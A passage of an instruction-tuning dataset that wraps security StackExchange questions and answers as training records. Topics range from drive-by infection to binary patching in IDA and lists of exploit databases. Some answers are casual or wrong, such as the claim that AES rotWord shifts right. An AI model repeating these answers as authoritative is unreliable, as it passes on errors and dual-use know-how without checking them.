    "output": "Answer: Yes, it is possible.\nJavascript is widely used for malware infection, and it's by far the most used way, but it's not the only vector for infection. If you run any vulnerable extension, or the browser uses any outdated library, then a specially crafted element can lead to code execution even without Javascript.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Can visiting a website virus your computer if you have JavaScript disabled?\nLet's say I visit a website that could potentially infect my computer by just from visiting it. If I disable JavaScript, is it still possible to infect my computer?\nI have already searched the site for this question, but I only find questions like this that don't mention disabling JavaScript",
      "answer": "Yes, it is possible.\nJavascript is widely used for malware infection, and it's by far the most used way, but it's not the only vector for infection. If you run any vulnerable extension, or the browser uses any outdated library, then a specially crafted element can lead to code execution even without Javascript."
    }
  },
  {
    "instruction": "Question: Have there been any instances of malware in custom ROMs for Android?\nHave there been any instances of malware or spyware packaged in custom ROMs, for example a malicious email app pre-installed that records your server IMAP username and password and forwards it to a 3rd part? Or part of the kernel that takes periodic photos? With regard to custom ROMs, I mean official and unofficial releases such as Cyanogenmod, AOKP, LiquidSmooth, etc.",
    "context": "",
    "output": "Answer: Not in any of the popular ones as far as I've heard. But you're free to build one yourself, which would then mean that it has happened.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Have there been any instances of malware in custom ROMs for Android?\nHave there been any instances of malware or spyware packaged in custom ROMs, for example a malicious email app pre-installed that records your server IMAP username and password and forwards it to a 3rd part? Or part of the kernel that takes periodic photos? With regard to custom ROMs, I mean official and unofficial releases such as Cyanogenmod, AOKP, LiquidSmooth, etc.",
      "answer": "Not in any of the popular ones as far as I've heard. But you're free to build one yourself, which would then mean that it has happened."
    }
  },
  {
    "instruction": "What is the answer to this question - Job laptop and VPN, security concerns for home network?\nI've asked if I could continue working from home. They said ok. The laptop belongs to the company with VPN on it. From home I'll connect the laptop to my personal network/rooter with wifi. When I'll deliver the laptop I'll change my personal/home wifi password. Is there any other security concerns for my home network while I am connected to the office VPN? They can see other devices of mine? Should I worry for something? They (the IT administrators) can access my home network?\n\n",
    "context": "",
    "output": "Is there any other security concerns for my home network while I am\n  connected to the office VPN\n\nSomeone from IT department of your work who wishes to gather info on your home network can do that using your laptop. (though this is so risky, you wouldn't believe the legal complications if you'll find out that)\n\nThey can see other devices of mine?\n\nARP, packet broadcasting, etc makes it easy to collect information passively.\n\nShould I worry for something?\n\nUnless someone took a personal interest of you, or there some kind of maniac trying to stalk you, no.\n\nThey (the IT administrators) can access my home network?\n\nPeculiar question. Network, yes. Shared files over the home network, yes. Sniff your traffic, yes. Get your wifi password, easily. Send something malicious to other devices, sure.\nGuest mode, Access list, separated VLAN, whatever segmentation or control features your router have, you can use to segment your work laptop from home devices.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Job laptop and VPN, security concerns for home network?\nI've asked if I could continue working from home. They said ok. The laptop belongs to the company with VPN on it. From home I'll connect the laptop to my personal network/rooter with wifi. When I'll deliver the laptop I'll change my personal/home wifi password. Is there any other security concerns for my home network while I am connected to the office VPN? They can see other devices of mine? Should I worry for something? They (the IT administrators) can access my home network?",
      "answer": "Is there any other security concerns for my home network while I am\n  connected to the office VPN\n\nSomeone from IT department of your work who wishes to gather info on your home network can do that using your laptop. (though this is so risky, you wouldn't believe the legal complications if you'll find out that)\n\nThey can see other devices of mine?\n\nARP, packet broadcasting, etc makes it easy to collect information passively.\n\nShould I worry for something?\n\nUnless someone took a personal interest of you, or there some kind of maniac trying to stalk you, no.\n\nThey (the IT administrators) can access my home network?\n\nPeculiar question. Network, yes. Shared files over the home network, yes. Sniff your traffic, yes. Get your wifi password, easily. Send something malicious to other devices, sure.\nGuest mode, Access list, separated VLAN, whatever segmentation or control features your router have, you can use to segment your work laptop from home devices."
    }
  },
  {
    "instruction": "Please answer this question: Microsoft account comprimised and someone did automatic sync and wondering if emails downloaded?\nI have a Microsoft account and today I got a Security alert saying \"We think that someone else might have accessed your account\" and had to change my password. When I checked my account activity it said there was an automatic sync in Algeria and Mexico and China yesterday. Does this mean it is likely people have downloaded copies of all my emails? I am worried that every single one of my emails has been downloaded.\nThis is what I see in my account activity in my Microsoft account:\nYesterday 8:31 PM\nAutomatic Sync\nMexico\nProtocol: IMAP\nIP: 189.219.94.26\nAccount alias:\nTime: Yesterday 8:31 PM\nApproximate location: Mexico\nType: Successful sync\nYou've secured your account since this activity occurred.\nLearn about more ways you can protect your account.\n\nI asked this question in the Microsoft forum but haven't had any replies.",
    "context": "",
    "output": "From what I can see, yes your emails have been compromised. If you look at the log you notice that it has synchronised IMAP - This suggests that the client has downloaded your email settings, folders and all of the emails contained In those folders.\nIf you didn't know already IMAP is a popular protocol for incoming emails.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Microsoft account comprimised and someone did automatic sync and wondering if emails downloaded?\nI have a Microsoft account and today I got a Security alert saying \"We think that someone else might have accessed your account\" and had to change my password. When I checked my account activity it said there was an automatic sync in Algeria and Mexico and China yesterday. Does this mean it is likely people have downloaded copies of all my emails? I am worried that every single one of my emails has been downloaded.\nThis is what I see in my account activity in my Microsoft account:\nYesterday 8:31 PM\nAutomatic Sync\nMexico\nProtocol: IMAP\nIP: 189.219.94.26\nAccount alias:\nTime: Yesterday 8:31 PM\nApproximate location: Mexico\nType: Successful sync\nYou've secured your account since this activity occurred.\nLearn about more ways you can protect your account.\n\nI asked this question in the Microsoft forum but haven't had any replies.",
      "answer": "From what I can see, yes your emails have been compromised. If you look at the log you notice that it has synchronised IMAP - This suggests that the client has downloaded your email settings, folders and all of the emails contained In those folders.\nIf you didn't know already IMAP is a popular protocol for incoming emails."
    }
  },
  {
    "instruction": "Answer the following question:\n\nmail.ru and slightsearch.ru hijacking browser default search engine set by admin\nI recently got malware installed on my PC that contained software that infected my google chrome, by hijacking my default search engine. I tried:\n\nRemoving newly installed programs from PC, using windows utility.\nUsing Microsoft essentials and hitman pro to fully scan my computer (removed  3 malware of which one was a program and the other adware)\nRemoving the newly created extension in google chrome.\n\nI tried to change my search engine back to default but I states that the administrator of the program has rights to change the search engine. I then:\n\nReset my chrome, and restarted my PC. Didn't work.\nThen went to registry and deleted all traces of slightsearch and any keys relating to default search engine of chrome.\n\nRestarted PC and nothing has changed at all. My home page is working as normal and I can search google when searching using the URL bar then it redirects to slightsearch.\nLastly, this malware even stared showing me ads on my desktop, when not in Chrome. Scanning and removing the malicious files solved this issue, but the search engine issue still exists.\nPlease help me solve this issue. And with all due respect, please do not give me the usual tips for removing popups or adware, because as already stated I have done all of these steps. Will appreciate any new solutions.\nRegards",
    "context": "",
    "output": "Ok so I eventually fixed the problem.\nI had to delete files under c:\\Windows\\System32\\GroupPolicyUsers\nChecked all the files contained in GroupPolicyUsers and then deleted those that related to chrome and that was messing with my Registry.\nRestarted chrome and now all is fixed!",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "mail.ru and slightsearch.ru hijacking browser default search engine set by admin\nI recently got malware installed on my PC that contained software that infected my google chrome, by hijacking my default search engine. I tried:\n\nRemoving newly installed programs from PC, using windows utility.\nUsing Microsoft essentials and hitman pro to fully scan my computer (removed  3 malware of which one was a program and the other adware)\nRemoving the newly created extension in google chrome.\n\nI tried to change my search engine back to default but I states that the administrator of the program has rights to change the search engine. I then:\n\nReset my chrome, and restarted my PC. Didn't work.\nThen went to registry and deleted all traces of slightsearch and any keys relating to default search engine of chrome.\n\nRestarted PC and nothing has changed at all. My home page is working as normal and I can search google when searching using the URL bar then it redirects to slightsearch.\nLastly, this malware even stared showing me ads on my desktop, when not in Chrome. Scanning and removing the malicious files solved this issue, but the search engine issue still exists.\nPlease help me solve this issue. And with all due respect, please do not give me the usual tips for removing popups or adware, because as already stated I have done all of these steps. Will appreciate any new solutions.\nRegards",
      "answer": "Ok so I eventually fixed the problem.\nI had to delete files under c:\\Windows\\System32\\GroupPolicyUsers\nChecked all the files contained in GroupPolicyUsers and then deleted those that related to chrome and that was messing with my Registry.\nRestarted chrome and now all is fixed!"
    }
  },
  {
    "instruction": "Question: How malware spreads nowadays\nHow malware nowadays spreads? For example, I have a Windows computer infected with some kind of malware (someone ran malicious executable on the computer when nobody was looking at it) and it can spread to other computers in, for example, local network. I think spreading by USB isn't the right or actual way nowadays.",
    "context": "",
    "output": "Answer: The attack vectors are the same now as they have always been:\n\nexecutable\nemail\nbrowser\nremote service exploit\n\nAs for executables, USB, downloads, cloud/network/remote file share, email attachments are all valid sources for people to click on something they shouldn't.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How malware spreads nowadays\nHow malware nowadays spreads? For example, I have a Windows computer infected with some kind of malware (someone ran malicious executable on the computer when nobody was looking at it) and it can spread to other computers in, for example, local network. I think spreading by USB isn't the right or actual way nowadays.",
      "answer": "The attack vectors are the same now as they have always been:\n\nexecutable\nemail\nbrowser\nremote service exploit\n\nAs for executables, USB, downloads, cloud/network/remote file share, email attachments are all valid sources for people to click on something they shouldn't."
    }
  },
  {
    "instruction": "Answer the following question:\n\nLaptop was stolen, they tried to log into my facebook from their location on my laptop\nCan I get some advice on what I should do next? Laptop was stolen yesterday and they tried to log in my facebook today like 20 minutes ago.",
    "context": "",
    "output": "Although you did not mention in which country you are in, it is very likely that stealing is a crime there. So you should go to the police.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Laptop was stolen, they tried to log into my facebook from their location on my laptop\nCan I get some advice on what I should do next? Laptop was stolen yesterday and they tried to log in my facebook today like 20 minutes ago.",
      "answer": "Although you did not mention in which country you are in, it is very likely that stealing is a crime there. So you should go to the police."
    }
  },
  {
    "instruction": "Can you tell me the answer to: Why do phishing emails have spelling and grammar mistakes?\nAre the spelling and grammar mistakes in phishing emails done on purpose? Is there some wisdom behind it? Or they are simply indicative of the fact that they've been written by someone who does not natively speak English?",
    "context": "",
    "output": "answer: Spam filters work by looking for certain words. (among many other test)\nIf these words are misspelled, the filter won't recognize them.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Why do phishing emails have spelling and grammar mistakes?\nAre the spelling and grammar mistakes in phishing emails done on purpose? Is there some wisdom behind it? Or they are simply indicative of the fact that they've been written by someone who does not natively speak English?",
      "answer": "Spam filters work by looking for certain words. (among many other test)\nIf these words are misspelled, the filter won't recognize them."
    }
  },
  {
    "instruction": "Question: Does a basic sudo-less Linux user or a sudo user but with a password for sudo offer enough security against webpages exploits?\nQuestion: I would like to know if it is good protection to browse the net using a non sudo, basic user account, on my Linux distro against webpage exploits such as scripts and other cross-platform threats based on HTML, Java, JavaScript, PDF, Perl, Ruby, Php or even SWF (Adobe Flash) for example ?\nI'm asking you and myself the same question in regards to a sudo user that would have to enter a password each time he uses sudo.\nThanks for your help !",
    "context": "",
    "output": "Answer: Security is a question of layers. \nThe non-su user with the least elevated privileges is one layer to reduce attacks. \nA continuously patched browser which makes every effort to minimize system risk through sandboxing and other techniques is the next layer. \nA hardened OS that encapsulates the browser and prevents stack/heap/privilege based attacks is the next layer. \nA content filtering system (either in the browser, on the machine, or at the gateway level) is the next layer. \nA breakdown at the browser or OS level would circumvent everything you have tried to achieve by reducing privilege level for the user.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Does a basic sudo-less Linux user or a sudo user but with a password for sudo offer enough security against webpages exploits?\nQuestion: I would like to know if it is good protection to browse the net using a non sudo, basic user account, on my Linux distro against webpage exploits such as scripts and other cross-platform threats based on HTML, Java, JavaScript, PDF, Perl, Ruby, Php or even SWF (Adobe Flash) for example ?\nI'm asking you and myself the same question in regards to a sudo user that would have to enter a password each time he uses sudo.\nThanks for your help !",
      "answer": "Security is a question of layers. \nThe non-su user with the least elevated privileges is one layer to reduce attacks. \nA continuously patched browser which makes every effort to minimize system risk through sandboxing and other techniques is the next layer. \nA hardened OS that encapsulates the browser and prevents stack/heap/privilege based attacks is the next layer. \nA content filtering system (either in the browser, on the machine, or at the gateway level) is the next layer. \nA breakdown at the browser or OS level would circumvent everything you have tried to achieve by reducing privilege level for the user."
    }
  },
  {
    "instruction": "Are there any tools for scanning for SQL injection vulnerabilities while logged in?\nSome pages of my website were vulnerable to SQL injection. The injection worked only when the user was logged in. I have now fixed this problem, and now I want to make sure that no similar problems remain. I have tried scanning with sqlninja and sqlmap but neither program has a provision to give website login details. Are there any tools that can scan for injection vulnerabilities with a logged in session?",
    "context": "",
    "output": "Let me offer you an easier alternative.\nIt is your website. You have access to the source code. Look through it and verify that all your database queries are parameterized. This is much much more efficient than scanning your website in the hopes that the tool you use tries the right injection at the right place.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Are there any tools for scanning for SQL injection vulnerabilities while logged in?\nSome pages of my website were vulnerable to SQL injection. The injection worked only when the user was logged in. I have now fixed this problem, and now I want to make sure that no similar problems remain. I have tried scanning with sqlninja and sqlmap but neither program has a provision to give website login details. Are there any tools that can scan for injection vulnerabilities with a logged in session?",
      "answer": "Let me offer you an easier alternative.\nIt is your website. You have access to the source code. Look through it and verify that all your database queries are parameterized. This is much much more efficient than scanning your website in the hopes that the tool you use tries the right injection at the right place."
    }
  },
  {
    "instruction": "Is SSL key generation client-side, server-side, or both?\nWho generates the session keys for a SSL symmetric encryption? Is it the client for both client and server where client generates part of it while the server generates the other part?",
    "context": "",
    "output": "In SSL protocol handshake both sides generate the same encryption key which is then used for the session. It is done following this procedure, in general:\n\nClient & server generate each a random value and send to each other\nServer sends the public key to the client\nThe client generates a value called \"pre-master secret\" using both random values, and encrypts it using server's key, then sends it to the server\nNow both client and server have each other's random values and \"pre-master secret\", so basing on this information they can both generate the same session key and start using it in encrypting the following messages.\n\nSee detailed protocol description for more in-depth explanation.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is SSL key generation client-side, server-side, or both?\nWho generates the session keys for a SSL symmetric encryption? Is it the client for both client and server where client generates part of it while the server generates the other part?",
      "answer": "In SSL protocol handshake both sides generate the same encryption key which is then used for the session. It is done following this procedure, in general:\n\nClient & server generate each a random value and send to each other\nServer sends the public key to the client\nThe client generates a value called \"pre-master secret\" using both random values, and encrypts it using server's key, then sends it to the server\nNow both client and server have each other's random values and \"pre-master secret\", so basing on this information they can both generate the same session key and start using it in encrypting the following messages.\n\nSee detailed protocol description for more in-depth explanation."
    }
  },
  {
    "instruction": "Answer the following question:\n\nAES subkey generation operations order\nI am preparing for my Information Security state exam. There is a question in preparation sheet that asks about order of operations to generate subkey for AES algorithm.\nOperations listed:\n\nXOR with constant\nXOR with first 4 bytes of subkey\ns-box\nCircular left shift\n\nI tried to google this question, but didn't find the answer. What is the right order?",
    "context": "",
    "output": "The \"key expansion\" or subkey generation in AES is an iterative process. Due to some work I am doing about this block cipher I have prepared an figure that may help you:\n\nThe algorithm is checking if the iterator of the generator is in congruent with 0 modulo #columns to proceed with 3 operations or only with one if is not.\nThe rotWord() is a circular shift (I think is to the right), the call to subBytes() uses the SBox and RCon in the bottom is an operation in the polynomial field.\nI hope this will help to find out yourself the answer for your test, without giving you the answer directly.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "AES subkey generation operations order\nI am preparing for my Information Security state exam. There is a question in preparation sheet that asks about order of operations to generate subkey for AES algorithm.\nOperations listed:\n\nXOR with constant\nXOR with first 4 bytes of subkey\ns-box\nCircular left shift\n\nI tried to google this question, but didn't find the answer. What is the right order?",
      "answer": "The \"key expansion\" or subkey generation in AES is an iterative process. Due to some work I am doing about this block cipher I have prepared an figure that may help you:\n\nThe algorithm is checking if the iterator of the generator is in congruent with 0 modulo #columns to proceed with 3 operations or only with one if is not.\nThe rotWord() is a circular shift (I think is to the right), the call to subBytes() uses the SBox and RCon in the bottom is an operation in the polynomial field.\nI hope this will help to find out yourself the answer for your test, without giving you the answer directly."
    }
  },
  {
    "instruction": "Answer this question:\n\n[windbg]kd - sxe ld  from a process context won't fire\nI'm trying to stop at a specific module load from a kernel debugger inside a specific process context.\nWhat i do is to first set sxe ld [process-name] let's say calc.exe.\nNow, when I run calc it works, but when i set sxe ld [dll-name] (say kernel32/ntdll) it won't work.",
    "context": "",
    "output": "A: I think usually this enables stopping on loading of kernel modules only (e.g. drivers). However, this SO answer claims it can work for user-mode processes if you send !gflag +ksl first (Enable loading of kernel debugger symbols).\nIt also describes how you can set process-specific kernel  breakpoints, e.g.\nkd> .process\n    Implicit process is now 00112233`44556677\nbp /p 0011223344556677 nt!NtMapViewOfSection\n\nThe NtMapViewOfSection syscall is used, among other purposes, to load DLLs so by stopping at it you should catch all further DLL loads.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "[windbg]kd - sxe ld  from a process context won't fire\nI'm trying to stop at a specific module load from a kernel debugger inside a specific process context.\nWhat i do is to first set sxe ld [process-name] let's say calc.exe.\nNow, when I run calc it works, but when i set sxe ld [dll-name] (say kernel32/ntdll) it won't work.",
      "answer": "I think usually this enables stopping on loading of kernel modules only (e.g. drivers). However, this SO answer claims it can work for user-mode processes if you send !gflag +ksl first (Enable loading of kernel debugger symbols).\nIt also describes how you can set process-specific kernel  breakpoints, e.g.\nkd> .process\n    Implicit process is now 00112233`44556677\nbp /p 0011223344556677 nt!NtMapViewOfSection\n\nThe NtMapViewOfSection syscall is used, among other purposes, to load DLLs so by stopping at it you should catch all further DLL loads."
    }
  },
  {
    "instruction": "Answer the question below.\nIDA & patching question\nI have an app in which I have to manually alter several flags in order to get to the part of the code Im interested in (imagine altering ZF to pass JNZ instruction). I have to do this every time I run application. What is the best way to do this permanently so I can simply run app to the part Im interested in?\nI can patch binary (in different program - ie change jnz to jmp) and load it in IDA again but I have no idea how to load IDA database into it (to get my comments, function names I made etc etc).\nIs there any way to do this?\nThanks.",
    "context": "",
    "output": "You don't have to use separate program to patch in ida.\nSimple select/highlight in ida-view where you wanna patch, then in Edit(menu)>>patch byte\nThen after you are done patching what you need, Edit(menu>>apply patches to input file.\nI usually keep the backup ( you get a option for that)",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "IDA & patching question\nI have an app in which I have to manually alter several flags in order to get to the part of the code Im interested in (imagine altering ZF to pass JNZ instruction). I have to do this every time I run application. What is the best way to do this permanently so I can simply run app to the part Im interested in?\nI can patch binary (in different program - ie change jnz to jmp) and load it in IDA again but I have no idea how to load IDA database into it (to get my comments, function names I made etc etc).\nIs there any way to do this?\nThanks.",
      "answer": "You don't have to use separate program to patch in ida.\nSimple select/highlight in ida-view where you wanna patch, then in Edit(menu)>>patch byte\nThen after you are done patching what you need, Edit(menu>>apply patches to input file.\nI usually keep the backup ( you get a option for that)"
    }
  },
  {
    "instruction": "Answer this question:\n\nServer SSLv2 enabled on non-webservers\nUsing Nessus I'm scanning our internal network for vulnerabilities and exploits. I've found a large number of instances where SSLv2 is enabled and is as a result, being flagged as a vulnerability. \nI understand the limitations of SSLv2 and even the limitations of SSLv3 so I'm quite happy to proceed with disabling SSLv2 on our Windows 2008 R2 boxes. \nMy question is that if these servers are not web servers and have no reason for clients to attempt to initiate a HTTPS session is it an exploitable vulnerability? Could an attacker still use a 'roll-back' attack and connect with SSLv2?",
    "context": "",
    "output": "A: SSLv2, enabled on a SSL server, is a potential vulnerability only if all of the following are true:\n\nThere is some client who wants to connect to that server and exchange sensitive data through that SSL tunnel.\nThe client agrees to use SSLv2 too.\nThe client and server don't implement the version rollback detection system described in RFC 2246, section E.2.\n\nUnder all these assumptions, then an attacker may force server and client to use SSLv2 even though both support SSLv3 or more. This in turn may imply some weakness depending on the underlying protocol (the biggest issue with SSLv2 is lack of verified termination, so attackers can force silent truncation, which is a problem if the underlying protocol is not self-terminated).\nGiven what you say, it is highly improbable that these \"SSLv2 support\" is a problem in your case.\nHowever, a more interesting question is: what are these servers anyway ? Why would a machine operate a network service, ready to do SSL, if there is no intended client at all ? Why not switching off these unused services ? The issue is not a question of SSLv2 vs SSLv3, but more a question of having network-capable services open for no good reason.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Server SSLv2 enabled on non-webservers\nUsing Nessus I'm scanning our internal network for vulnerabilities and exploits. I've found a large number of instances where SSLv2 is enabled and is as a result, being flagged as a vulnerability. \nI understand the limitations of SSLv2 and even the limitations of SSLv3 so I'm quite happy to proceed with disabling SSLv2 on our Windows 2008 R2 boxes. \nMy question is that if these servers are not web servers and have no reason for clients to attempt to initiate a HTTPS session is it an exploitable vulnerability? Could an attacker still use a 'roll-back' attack and connect with SSLv2?",
      "answer": "SSLv2, enabled on a SSL server, is a potential vulnerability only if all of the following are true:\n\nThere is some client who wants to connect to that server and exchange sensitive data through that SSL tunnel.\nThe client agrees to use SSLv2 too.\nThe client and server don't implement the version rollback detection system described in RFC 2246, section E.2.\n\nUnder all these assumptions, then an attacker may force server and client to use SSLv2 even though both support SSLv3 or more. This in turn may imply some weakness depending on the underlying protocol (the biggest issue with SSLv2 is lack of verified termination, so attackers can force silent truncation, which is a problem if the underlying protocol is not self-terminated).\nGiven what you say, it is highly improbable that these \"SSLv2 support\" is a problem in your case.\nHowever, a more interesting question is: what are these servers anyway ? Why would a machine operate a network service, ready to do SSL, if there is no intended client at all ? Why not switching off these unused services ? The issue is not a question of SSLv2 vs SSLv3, but more a question of having network-capable services open for no good reason."
    }
  },
  {
    "instruction": "Image upload meta information\nI'm coding an app that allows registered users (anyone who registers) to upload images to my nodejs background (processing with sharpjs)..\nI remove the exif section of the image for security. However I have realised that in-fact gps section of exif is extremely neat. Now I'm thinking to keep all of it. \nMy concern is someone might upload text such as \n{\n...\nGPSSpeed: pornhub.com\nGPSLatitudeRef: SOME EXTREME lenght text... 500000k+\n...\n}\n\nWell you get my fear.\nIs my fear legitimate?\nMy first intuition is too loop all the keys and match them to some schema (lenght, type, maybe even content) , but that would require me creating such a schema.",
    "context": "",
    "output": "Information in EXIF are not free data but have data types. The GPS position information are rational data types expressed as exactly 8 bytes. This means that you cannot put arbitrary string information in it but only floating point numbers. \nIt might make sense to restrict these values further to sane values. Given that you only want to keep the GPS information of the EXIF metadata it makes sense to extract these, remove the original EXIF data block and write a new one with only the GPS information in it as long as they are within a sane range. There are libraries in a variety of programming languages to do this.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Image upload meta information\nI'm coding an app that allows registered users (anyone who registers) to upload images to my nodejs background (processing with sharpjs)..\nI remove the exif section of the image for security. However I have realised that in-fact gps section of exif is extremely neat. Now I'm thinking to keep all of it. \nMy concern is someone might upload text such as \n{\n...\nGPSSpeed: pornhub.com\nGPSLatitudeRef: SOME EXTREME lenght text... 500000k+\n...\n}\n\nWell you get my fear.\nIs my fear legitimate?\nMy first intuition is too loop all the keys and match them to some schema (lenght, type, maybe even content) , but that would require me creating such a schema.",
      "answer": "Information in EXIF are not free data but have data types. The GPS position information are rational data types expressed as exactly 8 bytes. This means that you cannot put arbitrary string information in it but only floating point numbers. \nIt might make sense to restrict these values further to sane values. Given that you only want to keep the GPS information of the EXIF metadata it makes sense to extract these, remove the original EXIF data block and write a new one with only the GPS information in it as long as they are within a sane range. There are libraries in a variety of programming languages to do this."
    }
  },
  {
    "instruction": "Q: Can I keep large encrypted files in my mailbox on mail provider server?\nIs there any restriction or policy of large e-mail providers (such as GMail, Yahoo, Hotmail and similar) for keeping/storing large encrypted files by the users within their disk quota in 3rd party mailbox for privacy purposes?",
    "context": "",
    "output": " A: Pretty much all mail systems have a limit on email size. You can howevr overcome it by splitting your big file in several mails.\nAs for policy, you should read the terms of use of each provider to figure out. For instance GMail restricts (restricted?) usage of third-party applications to avoid that you use GMail as a virtual drive (there were several programs precisely for doing that).",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Can I keep large encrypted files in my mailbox on mail provider server?\nIs there any restriction or policy of large e-mail providers (such as GMail, Yahoo, Hotmail and similar) for keeping/storing large encrypted files by the users within their disk quota in 3rd party mailbox for privacy purposes?",
      "answer": "Pretty much all mail systems have a limit on email size. You can howevr overcome it by splitting your big file in several mails.\nAs for policy, you should read the terms of use of each provider to figure out. For instance GMail restricts (restricted?) usage of third-party applications to avoid that you use GMail as a virtual drive (there were several programs precisely for doing that)."
    }
  },
  {
    "instruction": "How to identify compromised SIM Cards?\nReason for this question: \nThis article regarding NSA / GCHQ SIM Hacking) states some manufacturers of SIM-Card have been hacked to steal SIM-Card \"Ki\". I want to know the likelihood of the SIM-Cards I deal with being compromised.\nIs it possible for me to identify the manufacturer of a given SIM Card?\nIf yes: How?\nEDIT:\nSomeone mentioned the text printed on the SIM-Card:\nIs there any way to identify the Manufacturer if these markings are gone because the Card was cropped to fit in a smaller socket?\nI know that there is no such thing as absolute security even if the Cards i deal with are not from Gemalto. But i am still curious if the Cards i deal with are certainly compromised.",
    "context": "",
    "output": "Insert the SIM card into a standard smart card reader and Google its ATR string, that will definitely give you, at least a hint about the manufacturer if not more.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How to identify compromised SIM Cards?\nReason for this question: \nThis article regarding NSA / GCHQ SIM Hacking) states some manufacturers of SIM-Card have been hacked to steal SIM-Card \"Ki\". I want to know the likelihood of the SIM-Cards I deal with being compromised.\nIs it possible for me to identify the manufacturer of a given SIM Card?\nIf yes: How?\nEDIT:\nSomeone mentioned the text printed on the SIM-Card:\nIs there any way to identify the Manufacturer if these markings are gone because the Card was cropped to fit in a smaller socket?\nI know that there is no such thing as absolute security even if the Cards i deal with are not from Gemalto. But i am still curious if the Cards i deal with are certainly compromised.",
      "answer": "Insert the SIM card into a standard smart card reader and Google its ATR string, that will definitely give you, at least a hint about the manufacturer if not more."
    }
  },
  {
    "instruction": "What is the answer to this question - vulnerable getlogin\nI was reading \"A taxonomy of Coding Errors\" and I have a doubt regarding the point mentioned in C/C++ >> API Abuse >> Often Misused: Authentication(getlogin).\nI fail to understand the attack vector mentioned there. To quote a statement -\n\nThe getlogin() function is supposed to return a string containing the name of the user currently logged in at the terminal, but an attacker can cause getlogin() to return the name of any user logged in to the machine.\n\nHow does this work?\n\n",
    "context": "",
    "output": "getlogin() works by checking a property of stdin.  However, a malicious attacker can start your program with stdin redirected to some other user's controlling terminal, and that will fool getlogin().\nDon't use getlogin() for security purposes.  You'll want to look at getuid(), geteuid(), getpwuid(), and similar methods.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "vulnerable getlogin\nI was reading \"A taxonomy of Coding Errors\" and I have a doubt regarding the point mentioned in C/C++ >> API Abuse >> Often Misused: Authentication(getlogin).\nI fail to understand the attack vector mentioned there. To quote a statement -\n\nThe getlogin() function is supposed to return a string containing the name of the user currently logged in at the terminal, but an attacker can cause getlogin() to return the name of any user logged in to the machine.\n\nHow does this work?",
      "answer": "getlogin() works by checking a property of stdin.  However, a malicious attacker can start your program with stdin redirected to some other user's controlling terminal, and that will fool getlogin().\nDon't use getlogin() for security purposes.  You'll want to look at getuid(), geteuid(), getpwuid(), and similar methods."
    }
  },
  {
    "instruction": "Answer the question below.\nShould I keep to HDDs for sensitive data?\nIt appears that in many cases, there is no way (short of physical destruction) to securely delete data from an arbitrary SSD. Unfortunately, I do not know how an individual (not a business) can destroy a drive without violating HAZMAT laws.\nShould I just stick with HDDs? I know I can erase those securely.",
    "context": "",
    "output": "Either way there are risks, but the best solution is to use full-disk encryption.  \nWith SSD's, there is the risk of data that is left readable by technical tools in areas of the drive that have been removed from service by wear leveling. \nBut the same thing applies to hard disk platters, which likewise \"house keep\" in this fashion. \nI am not aware of any physical destruction issues that would apply only to SSD's that would not also apply to modern hard disks (which have circuit boards, flash chips, etc.\nIt seems to me the solution is to initialize the SSD (or physical platter hard disk), out of the package, with your favorite secure full disk encryption software; and rely on the security that provides.  If you want further assurance, then there are services that will reliably grind used hard drives into metal, plastic and epoxy confetti.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Should I keep to HDDs for sensitive data?\nIt appears that in many cases, there is no way (short of physical destruction) to securely delete data from an arbitrary SSD. Unfortunately, I do not know how an individual (not a business) can destroy a drive without violating HAZMAT laws.\nShould I just stick with HDDs? I know I can erase those securely.",
      "answer": "Either way there are risks, but the best solution is to use full-disk encryption.  \nWith SSD's, there is the risk of data that is left readable by technical tools in areas of the drive that have been removed from service by wear leveling. \nBut the same thing applies to hard disk platters, which likewise \"house keep\" in this fashion. \nI am not aware of any physical destruction issues that would apply only to SSD's that would not also apply to modern hard disks (which have circuit boards, flash chips, etc.\nIt seems to me the solution is to initialize the SSD (or physical platter hard disk), out of the package, with your favorite secure full disk encryption software; and rely on the security that provides.  If you want further assurance, then there are services that will reliably grind used hard drives into metal, plastic and epoxy confetti."
    }
  },
  {
    "instruction": "Answer this question:\n\nExploit database for NVD vulnerabilities\nI have the list of vulnerabilities (CVEs) in the NVD database. I need to find which one has an exploit. Is there any database available to get the list of all the exploits for CVEs? or is there any API to get them?",
    "context": "",
    "output": "A: Few sources I search for exploits (by CVE):\n\nExploit Database \nCX Security\nVulnerability & Exploit Database\n0day.today (accessible via tor onion service)\nVulDB (not exactly for exploits, but helpful)\n\nDo check this list for additional sources of vulnerability databases",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
